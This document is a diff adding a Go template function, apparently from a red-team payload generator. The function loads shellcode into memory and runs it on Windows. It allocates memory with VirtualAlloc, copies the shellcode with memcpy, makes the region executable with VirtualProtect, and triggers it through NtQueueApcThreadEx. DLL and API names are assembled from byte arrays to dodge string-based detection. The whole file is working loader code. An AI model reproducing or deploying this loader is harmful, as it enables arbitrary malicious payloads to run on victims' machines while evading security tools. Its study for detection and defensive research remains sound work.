@@ -1,0 +1,124 @@
+func run(shellcode []byte) {
+
+	const (
+		// MEM_COMMIT is a Windows constant used with Windows API calls
+		MEM_COMMIT = 0x1000
+		// MEM_RESERVE is a Windows constant used with Windows API calls
+		MEM_RESERVE = 0x2000
+		// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
+		PAGE_EXECUTE_READ = 0x20
+		// PAGE_READWRITE is a Windows constant used with Windows API calls
+		PAGE_READWRITE = 0x04
+
+		PAGE_EXECUTE_READWRITE = 0x40
+	)
+
+	// https://docs.microsoft.com/en-us/windows/win32/midl/enum
+	const (
+		QUEUE_USER_APC_FLAGS_NONE = iota
+		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+		QUEUE_USER_APC_FLGAS_MAX_VALUE
+	)
+
+	{{if .Debug}}
+	printDebug("info","Loading msvcrt.dll, kernel32.dll and ntdll.dll...")
+	{{end}}
+
+	kernel32 := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
+	ntdll := windows.NewLazySystemDLL(string([]byte{'n','t','d','l','l','.','d','l','l'}))
+    msvcrt := windows.NewLazyDLL(string([]byte{'m','s','v','c','r','t','.','d','l','l'}))
+
+	{{if .Debug}}
+	printDebug("info","Loading VirtualAlloc, VirtualProtect, NtQueueApcThreadEx and memcpy procedures...")
+	{{end}}
+
+
+	VirtualAlloc := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','A','l','l','o','c'}))
+	VirtualProtect := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','P','r','o','t','e','c','t'}))
+	memcpy := msvcrt.NewProc(string([]byte{'m','e','m','c','p','y'}))
+	NtQueueApcThreadEx := ntdll.NewProc(string([]byte{'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d','E','x'}))
+
+	{{if .Debug}}
+	printDebug("info","Calling VirtualAlloc for shellcode...")
+	{{end}}
+	{{if .Debug}}
+	printDebug("info","Length of the shellcode: %d bytes",len(shellcode))
+	{{end}}
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+	if errVirtualAlloc != nil && errVirtualAlloc != syscall.Errno(0){
+		{{if .Debug}}
+		printDebug("error","Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
+		{{end}}
+		return
+	}
+
+	if addr == 0 {
+		{{if .Debug}}
+		printDebug("error","VirtualAlloc failed and returned 0")
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Allocated %d bytes", len(shellcode))
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("debug","Copying shellcode to memory with memcpy...")
+	{{end}}
+	_, _, errMemCpy := memcpy.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if errMemCpy != nil && errMemCpy != syscall.Errno(0) {
+		{{if .Debug}}
+		printDebug("error","Error calling memcpy:\r\n%s", errMemCpy.Error())
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Shellcode copied to memory")
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("debug","Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
+	{{end}}
+
+	oldProtect := PAGE_READWRITE
+	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtect != nil && errVirtualProtect != syscall.Errno(0) {
+		{{if .Debug}}
+		printDebug("error", "Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Shellcode memory region changed to PAGE_EXECUTE_READ")
+	{{end}}
+
+	thread := syscall.Handle(windows.CurrentThread())
+	{{if .Debug}}
+	printDebug("info","Got handle to current thread: %v\n", thread)
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("debug","Calling NtQueueApcThreadEx...")
+	{{end}}
+	
+	_, _, errNtQueueAPC := NtQueueApcThreadEx.Call(uintptr(thread), QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
+	if errNtQueueAPC != syscall.Errno(0){
+		{{if .Debug}}
+		printDebug("error","Error calling NtQueueApcThreadEx:\n%s", errNtQueueAPC)
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Queued special user APC")
+	{{end}}
+	{{if .Debug}}
+	printDebug("info","Shellcode Executed")
+	{{end}}
+
+}
